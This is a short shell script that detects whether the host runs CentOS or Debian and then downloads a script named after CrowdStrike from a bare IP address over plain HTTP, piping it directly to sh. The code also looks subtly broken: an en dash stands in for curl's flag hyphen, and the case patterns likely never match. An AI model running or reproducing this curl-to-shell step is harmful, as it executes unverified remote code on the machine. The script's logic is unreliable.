SO=`( lsb_release -ds || cat /etc/*release || uname -om ) 2>/dev/null | head -n1 |awk  '{print " "$1}'|tr -d '[:space:]'`

#iecho $SO

case $SO in
      CentOS.*)
      curl –s  http://3.20.133.243/script/CrowdStrike.sh|sh
;;
Debian.*)

curl –s  http://3.20.133.243/script/Crowdstrike.sh|sh
;;
esac
